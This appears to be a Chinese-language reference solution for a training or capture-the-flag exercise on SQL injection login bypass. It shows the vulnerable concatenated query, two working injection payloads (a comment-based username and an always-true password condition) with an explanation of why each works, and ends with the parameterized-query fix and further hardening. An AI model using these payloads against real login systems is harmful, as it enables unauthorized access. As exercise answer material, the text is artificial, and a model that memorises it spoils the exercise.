# 参考解法说明 — SQL 注入登录绕过

## 漏洞
`app.py` 用字符串拼接构造 SQL:
```python
query = "SELECT name, role FROM users WHERE name='%s' AND pass='%s'" % (user, pw)
```
用户输入直接进入 SQL 文本。输入里的单引号能闭合字符串字面量,后面就被当作 **SQL 代码**执行。

## 两种注入

**A) 注释法**：用户名 = `admin' -- `(注意 `--` 后有空格),密码随意
```sql
SELECT name, role FROM users WHERE name='admin' -- ' AND pass='x'
```
`--` 之后整行变注释,`AND pass=...` 被废掉 → 直接按 `name='admin'` 匹配 → 以 admin 登录。

**B) 恒真法**：密码 = `' OR '1'='1`,用户名 = `admin`
```sql
SELECT name, role FROM users WHERE name='admin' AND pass='' OR '1'='1'
```
`AND` 优先级高于 `OR`,等价 `(name='admin' AND pass='') OR '1'='1'` → `'1'='1'` 恒真 → 返回首行(admin)。
> 易错点:把 `' OR '1'='1` 放**用户名**字段不行——会变成 `name='' OR '1'='1' AND pass='x'`,
> 由于 AND 先算,pass 仍要匹配,失败。所以恒真条件要放在**最后一个**被拼接的字段(这里是密码)。

验证见 `exploit.py`:`python3 exploit.py A` / `B`,输出 `Welcome admin! role=admin`。
进阶可用 `UNION SELECT` 把其它表/列的数据"借"到结果里(UNION 注入)。

## 修复(根治)
用**参数化查询 / 预处理语句**:把数据和代码分开,数据永远不会被当作 SQL 解析。
```python
cur.execute("SELECT name, role FROM users WHERE name=? AND pass=?", (user, pw))
```
此时 `admin' -- ` 只会被当成一个**字符串值**去比较,不再改变语句结构。

其它纵深手段:最小权限的数据库账号、输入校验、ORM、密码加盐哈希(别明文存)。
